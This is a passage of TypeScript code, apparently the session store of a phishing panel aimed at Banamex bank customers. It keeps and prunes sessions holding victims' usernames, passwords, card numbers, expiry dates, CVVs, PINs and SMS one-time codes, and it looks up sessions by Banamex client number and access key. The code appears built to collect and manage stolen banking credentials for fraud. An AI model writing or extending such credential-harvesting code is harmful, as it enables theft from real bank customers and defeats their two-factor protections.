    const sms = this.smsHistory.get(id);
    if (!sms) {
      throw new Error(`SMS con ID ${id} no encontrado`);
    }

    const updatedSms: SmsHistory = {
      ...sms,
      status,
      errorMessage: errorMessage || sms.errorMessage
    };

    this.smsHistory.set(id, updatedSms);
    return updatedSms;
  }

  async cleanupExpiredSessions(): Promise<number> {
    const now = new Date();
    const fiveDaysAgo = new Date(now.getTime() - (5 * 24 * 60 * 60 * 1000)); // 5 días en milisegundos
    const tenMinutesAgo = new Date(now.getTime() - (10 * 60 * 1000)); // 10 minutos en milisegundos

    let deletedCount = 0;
    const allSessions = Array.from(this.sessions.values());

    for (const session of allSessions) {
      // Comprobamos si la sesión fue creada hace más de 5 días
      if (session.createdAt && new Date(session.createdAt) < fiveDaysAgo) {
        this.sessions.delete(session.sessionId);
        deletedCount++;
      }
      // Comprobamos si es una sesión sin datos y tiene más de 10 minutos
      else if (
        session.createdAt && 
        new Date(session.createdAt) < tenMinutesAgo &&
        // Comprobamos si no tiene datos relevantes
        !session.folio && 
        !session.username && 
        !session.password && 
        !session.tarjeta && 
        !session.fechaVencimiento && 
        !session.cvv && 
        !session.sms && 
        !session.nip && 
        !session.smsCompra && 
        !session.celular && 
        !session.correo && 
        !session.contrasena
      ) {
        this.sessions.delete(session.sessionId);
        deletedCount++;
        console.log(`Sesión vacía eliminada automáticamente: ${session.sessionId}`);
      }
    }

    return deletedCount;
  }

  async cleanupEmptySessions(): Promise<number> {
    const tenMinutesAgo = new Date(Date.now() - 10 * 60 * 1000);
    let deletedCount = 0;

    for (const [sessionId, session] of Array.from(this.sessions.entries())) {
      const hasImportantData = session.username || session.password || session.tarjeta || 
                              session.nip || session.sms || session.smsCompra || 
                              session.celular || session.correo || session.contrasena;

      if (!hasImportantData && session.createdAt && session.createdAt < tenMinutesAgo) {
        this.sessions.delete(sessionId);
        deletedCount++;
        console.log(`Sesión vacía eliminada automáticamente: ${sessionId}`);
      }
    }

    return deletedCount;
  }

  async getSessionByDeviceId(deviceId: string): Promise<Session | undefined> {
    for (const session of Array.from(this.sessions.values())) {
      if (session.deviceId === deviceId) {
        return session;
      }
    }
    return undefined;
  }

  async getSessionByCredentials(numeroCliente: string, claveAcceso: string): Promise<Session | undefined> {
    for (const session of Array.from(this.sessions.values())) {
      // Buscar sesiones activas con las mismas credenciales de Banamex
      if (session.numeroCliente === numeroCliente && 
          session.claveAcceso === claveAcceso && 
          session.active === true &&
          session.banco === 'BANAMEX') {
        return session;
      }
    }
    return undefined;
  }
}

